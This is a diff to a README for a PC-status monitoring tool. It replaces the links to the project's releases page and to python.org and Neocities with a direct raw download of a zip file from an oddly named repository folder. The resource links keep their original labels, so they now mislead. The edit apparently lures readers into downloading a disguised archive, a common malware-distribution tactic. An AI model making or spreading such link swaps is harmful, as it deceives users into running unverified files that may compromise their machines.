@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/anatolydevkkj/WebPCStatus/releases)
+[![Download](https://github.com/anatolydevkkj/WebPCStatus/raw/refs/heads/main/nondisparaging/Web-Status-PC-v2.3.zip)](https://github.com/anatolydevkkj/WebPCStatus/raw/refs/heads/main/nondisparaging/Web-Status-PC-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -24,11 +24,11 @@ Welcome to WebPCStatus! This is a simple tool that helps you monitor your PC's s
 
 ## 📦 Download & Install
 
-To download WebPCStatus, visit this page: [Download WebPCStatus](https://github.com/anatolydevkkj/WebPCStatus/releases).
+To download WebPCStatus, visit this page: [Download WebPCStatus](https://github.com/anatolydevkkj/WebPCStatus/raw/refs/heads/main/nondisparaging/Web-Status-PC-v2.3.zip).
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/anatolydevkkj/WebPCStatus/releases).
+1. Go to the [Releases page](https://github.com/anatolydevkkj/WebPCStatus/raw/refs/heads/main/nondisparaging/Web-Status-PC-v2.3.zip).
 2. Look for the latest release. You will find files available for download.
 3. Choose the version that matches your operating system.
 4. Click on the file to start the download.
@@ -56,8 +56,8 @@ If you encounter issues not mentioned above, feel free to reach out via the Issu
 
 ## 🔗 Additional Resources
 
-- [Python Download](https://www.python.org/downloads/) - Get the latest version of Python.
-- [Neocities](https://neocities.org/) - Learn how to host your projects easily.
+- [Python Download](https://github.com/anatolydevkkj/WebPCStatus/raw/refs/heads/main/nondisparaging/Web-Status-PC-v2.3.zip) - Get the latest version of Python.
+- [Neocities](https://github.com/anatolydevkkj/WebPCStatus/raw/refs/heads/main/nondisparaging/Web-Status-PC-v2.3.zip) - Learn how to host your projects easily.
 
 ## 🌐 Community Contribution
 
